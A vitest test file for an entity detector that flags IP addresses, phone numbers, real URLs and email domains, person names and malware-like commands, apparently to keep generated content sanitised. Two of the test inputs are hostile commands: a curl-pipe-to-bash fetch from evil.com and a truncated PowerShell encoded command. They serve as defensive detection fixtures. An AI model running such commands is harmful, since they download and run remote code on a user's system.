import { describe, expect, it } from 'vitest';

import {
  containsIpLiteral,
  detectEntityReferences,
  detectPhoneNumbers,
  detectActionablePatterns,
  detectUrls,
  detectEmails,
} from '../entity-detector.js';

describe('entity-detector', () => {
  describe('containsIpLiteral', () => {
    it('detects IPv4 addresses', () => {
      expect(containsIpLiteral('Connect to 10.0.0.8')).toBe(true);
      expect(containsIpLiteral('Server at 192.168.1.1')).toBe(true);
    });

    it('detects IPv6 addresses', () => {
      expect(containsIpLiteral('Route through 2001:4860:4860::8888')).toBe(true);
    });

    it('returns false for text without IPs', () => {
      expect(containsIpLiteral('No IP here')).toBe(false);
    });
  });

  describe('detectPhoneNumbers', () => {
    it('detects phone numbers', () => {
      const findings: Parameters<typeof detectPhoneNumbers>[1] = [];
      detectPhoneNumbers(
        [{ path: '$.body.justification', value: 'Call +49 30 123 4567' }],
        findings,
      );

      expect(findings).toHaveLength(1);
      expect(findings[0]?.code).toBe('PHONE_NUMBER_DETECTED');
    });

    it('does not flag content without phone numbers', () => {
      const findings: Parameters<typeof detectPhoneNumbers>[1] = [];
      detectPhoneNumbers([{ path: '$.body.justification', value: 'No phone here' }], findings);

      expect(findings).toHaveLength(0);
    });
  });

  describe('detectActionablePatterns', () => {
    it('detects powershell encoded commands', () => {
      const findings: Parameters<typeof detectActionablePatterns>[1] = [];
      detectActionablePatterns(
        [{ path: '$.body.summary', value: 'Run powershell -enc SQBFA...' }],
        findings,
      );

      expect(findings).toHaveLength(1);
      expect(findings[0]?.code).toBe('ACTIONABLE_MALWARE_CONTENT');
    });

    it('detects curl pipe to bash', () => {
      const findings: Parameters<typeof detectActionablePatterns>[1] = [];
      detectActionablePatterns(
        [{ path: '$.body.summary', value: 'curl https://evil.com/script.sh | bash' }],
        findings,
      );

      expect(findings).toHaveLength(1);
      expect(findings[0]?.code).toBe('ACTIONABLE_MALWARE_CONTENT');
    });

    it('does not flag normal content', () => {
      const findings: Parameters<typeof detectActionablePatterns>[1] = [];
      detectActionablePatterns(
        [{ path: '$.body.summary', value: 'Normal email content' }],
        findings,
      );

      expect(findings).toHaveLength(0);
    });
  });

  describe('detectUrls', () => {
    it('detects URLs with non-reserved TLDs', () => {
      const findings: Parameters<typeof detectUrls>[1] = [];
      detectUrls([{ path: '$.links[0].url', value: 'https://github.com/login' }], findings);

      expect(findings).toHaveLength(1);
      expect(findings[0]?.code).toBe('REAL_URL_DETECTED');
    });

    it('accepts URLs with reserved TLDs', () => {
      const findings: Parameters<typeof detectUrls>[1] = [];
      detectUrls(
        [{ path: '$.links[0].url', value: 'https://verify.nexion.invalid/portal' }],
        findings,
      );

      expect(findings).toHaveLength(0);
    });

    it('skips structured field references', () => {
      const findings: Parameters<typeof detectUrls>[1] = [];
      detectUrls([{ path: '$.body.justification', value: 'attachments[0].name' }], findings);

      expect(findings).toHaveLength(0);
    });
  });

  describe('detectEmails', () => {
    it('detects emails with non-reserved TLDs', () => {
      const findings: Parameters<typeof detectEmails>[1] = [];
      detectEmails([{ path: '$.headers.from', value: 'user@gmail.com' }], findings);

      expect(findings).toHaveLength(1);
      expect(findings[0]?.code).toBe('REAL_EMAIL_DOMAIN_DETECTED');
    });

    it('accepts emails with reserved TLDs', () => {
      const findings: Parameters<typeof detectEmails>[1] = [];
      detectEmails([{ path: '$.headers.from', value: 'liaison@nexion.test' }], findings);

      expect(findings).toHaveLength(0);
    });
  });

  describe('detectEntityReferences', () => {
    it('detects likely real-world person names with honorifics', () => {
      const findings: Parameters<typeof detectEntityReferences>[1] = [];
      detectEntityReferences([{ path: '$.body.signature', value: 'Dr. John Smith' }], findings);

      expect(findings.some((f) => f.code === 'REAL_PERSON_DETECTED')).toBe(true);
    });

    it('does not flag allowed entities', () => {
      const findings: Parameters<typeof detectEntityReferences>[1] = [];
      detectEntityReferences(
        [{ path: '$.body.signature', value: 'Nexion Industries Security Team' }],
        findings,
      );

      expect(findings).toHaveLength(0);
    });
  });
});
